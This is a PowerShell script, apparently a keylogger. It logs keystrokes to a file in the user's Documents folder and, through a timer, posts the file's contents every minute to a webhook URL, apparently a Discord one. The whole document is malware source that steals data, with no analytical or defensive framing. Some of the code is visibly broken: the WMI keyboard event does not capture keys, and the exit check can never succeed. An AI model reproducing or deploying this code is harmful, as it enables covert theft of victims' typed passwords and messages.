# Define the log file path
$logFilePath = "$env:USERPROFILE\Documents\keylog.txt"

# Initialize the last keystroke time
$lastKeystrokeTime = [System.DateTime]::Now

# Function to upload data to Discord
function Upload-Discord {
    param (
        [string]$text
    )

    $hookurl = "$dc"
    $Body = @{
        'keylog' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }
}

# Check if the log file exists, and if not, create it
if (-not (Test-Path -Path $logFilePath)) {
    try {
        $null | Out-File -FilePath $logFilePath
    } catch {
        Write-Host "Error creating log file: $_"
    }
}

# Initialize the keylog buffer
$keylog = ""

# Create a timer to upload keylog to Discord every minute
$timer = New-Object System.Timers.Timer
$timer.Interval = 60000  # 60000 ms = 60 seconds

# Define the timer action
$timerAction = {
    $text = Get-Content -Path $logFilePath
    if (-not [string]::IsNullOrEmpty($text)) {
        Upload-Discord -text $text
    }
}

# Register the timer event
Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action $timerAction

# Start the timer
$timer.Start()

# Event handler for keypress
$OnKeyPress = {
    param (
        $key
    )
    $now = [System.DateTime]::Now
    $elapsedTime = $now - $lastKeystrokeTime
    $lastKeystrokeTime = $now

    # Log the key
    Add-Content -Path $logFilePath -Value $key
}

# Register the keypress event
Register-WmiEvent -Class Win32_Keyboard -SourceIdentifier "KeyPress" -Action $OnKeyPress

# Start the script and wait for Ctrl+Alt+0 to stop
Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."

while ($true) {
    $key = [Console]::ReadKey()
    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "D0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "D0")) {
        # Stop the script and unregister events
        $timer.Stop()
        Unregister-Event -SourceIdentifier "KeyPress"
        break
    }
}
